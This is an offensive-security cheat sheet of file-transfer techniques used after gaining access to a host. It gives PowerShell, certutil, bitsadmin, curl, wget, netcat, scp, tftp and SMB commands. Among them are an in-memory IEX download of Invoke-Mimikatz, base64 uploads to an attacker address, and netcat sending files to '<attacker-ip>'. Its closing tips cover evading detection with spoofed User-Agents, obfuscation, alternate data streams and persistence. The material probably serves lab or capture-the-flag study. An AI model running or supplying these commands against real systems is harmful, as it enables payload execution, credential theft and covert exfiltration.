
### PowerShell Commands

1. **Download a File**
    
    ```powershell
    Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1
    ```
    
2. **Execute File in Memory**
    
    ```powershell
    IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')
    ```
    
3. **Upload a File**
    
    ```powershell
    Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
    ```
    
4. **Download with Custom User-Agent**
    
    ```powershell
    Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
    ```
    
5. **Base64 Encoded Upload**
    
    ```powershell
    $bytes = [System.IO.File]::ReadAllBytes("C:\Temp\file.txt")
    $b64 = [System.Convert]::ToBase64String($bytes)
    Invoke-WebRequest -Uri http://10.10.10.32/upload -Method POST -Body $b64
    ```
    

### Windows Native Tools

6. **Bitsadmin (Deprecated but Still Useful)**
    
    ```powershell
    bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
    ```
    
7. **Certutil (Native to Windows for Certificate Management)**
    
    ```powershell
    certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
    ```
    

### Linux-Based Tools

8. **Wget**
    
    ```bash
    wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
    ```
    
9. **cURL**
    
    ```bash
    curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
    ```
    
10. **Python HTTP File Download**
    

```python
import requests
response = requests.get('http://10.10.10.32/nc.exe')
with open('nc.exe', 'wb') as file:
    file.write(response.content)
```

### Other Methods

11. **PHP File Download**

```php
php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

12. **SCP (Secure Copy Protocol) - Upload**
    
    ```bash
    scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
    ```
    
13. **SCP - Download**
    
    ```bash
    scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
    ```
    
14. **Netcat (Linux/Windows)** **Send File:**
    

```bash
nc -lvp 4444 > received_file
```

**Receive File:**

```bash
nc <attacker-ip> 4444 < file_to_send
```

15. **FTP Upload/Download (Interactive)**

```bash
ftp 10.10.10.32
```

16. **TFTP (Trivial File Transfer Protocol)** **Download:**

```bash
tftp -i 10.10.10.32 GET nc.exe
```

**Upload:**

```bash
tftp -i 10.10.10.32 PUT nc.exe
```

17. **SMB (Using SMBClient)**

```bash
smbclient \\10.10.10.32\share -U username
put file.txt
get file.txt
```

---

### Extra Tips

- **Bypass Restrictions:** Consider using alternative ports, URL encoding, or modifying headers to bypass security restrictions.
- **Evasion Techniques:** Use legitimate-looking User-Agents, filenames, or paths to evade detection.
- **Persistence:** Combine these methods with scheduled tasks or registry modifications for persistence.
- **File Obfuscation:** Encode files in Base64 to evade basic detection.
- **Alternate Data Streams (Windows):**
    
    ```powershell
    type nc.exe > file.txt:stream
    ```
    
- **Compression & Encryption:** Compress files using `zip` or `7z` with a password.

    ```bash
   7z a -psecret -mhe protected.7z file.txt
    ```
